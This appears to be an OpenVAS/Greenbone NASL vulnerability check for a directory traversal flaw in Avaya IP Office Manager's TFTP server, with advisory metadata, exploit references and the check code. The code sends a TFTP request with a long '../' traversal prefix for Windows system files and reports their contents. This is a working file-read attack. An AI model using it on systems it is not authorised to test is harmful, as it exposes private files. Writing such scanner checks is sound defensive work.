if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.802027" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2011-07-14 13:16:44 +0200 (Thu, 14 Jul 2011)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_bugtraq_id( 48272 );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Avaya IP Office Manager TFTP Server Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://secpod.org/blog/?p=225" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/48272" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17507" );
	script_xref( name: "URL", value: "http://support.avaya.com/css/P8/documents/100141179" );
	script_xref( name: "URL", value: "http://secpod.org/SECPOD_Exploit-Avaya-IP-Manager-Dir-Trav.py" );
	script_xref( name: "URL", value: "http://secpod.org/advisories/SECPOD_Avaya_IP_Manager_TFTP_Dir_Trav.txt" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Remote file access" );
	script_dependencies( "tftpd_detect.sc", "global_settings.sc", "tftpd_backdoor.sc", "os_detection.sc" );
	script_require_udp_ports( "Services/udp/tftp", 69 );
	script_mandatory_keys( "tftp/detected" );
	script_require_keys( "Host/runs_windows" );
	script_exclude_keys( "keys/TARGET_IS_IPV6" );
	script_tag( name: "impact", value: "Successful exploitation will allow attackers to read arbitrary files on the
  affected application." );
	script_tag( name: "affected", value: "Avaya IP Office Manager TFTP Server Version 8.1 and prior." );
	script_tag( name: "insight", value: "The flaw is due to an error while handling certain requests containing
  'dot dot' sequences (..), which can be exploited to download arbitrary files from the host system." );
	script_tag( name: "solution", value: "Apply the patch from the referenced advisory." );
	script_tag( name: "summary", value: "The host is running Avaya IP Office Manager TFTP Server and is
  prone to directory traversal vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
if(TARGET_IS_IPV6()){
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
require("tftp.inc.sc");
port = service_get_port( default: 69, proto: "tftp", ipproto: "udp" );
if(!tftp_has_reliable_get( port: port )){
	exit( 0 );
}
files = traversal_files( "windows" );
for file in keys( files ) {
	res = tftp_get( port: port, path: "../../../../../../../../../../../../" + files[file] );
	if(!res){
		continue;
	}
	if(egrep( pattern: file, string: res, icase: TRUE )){
		report = NASLString( "The " + files[file] + " file contains:\\n", res );
		security_message( port: port, data: report, proto: "udp" );
		exit( 0 );
	}
}
exit( 99 );

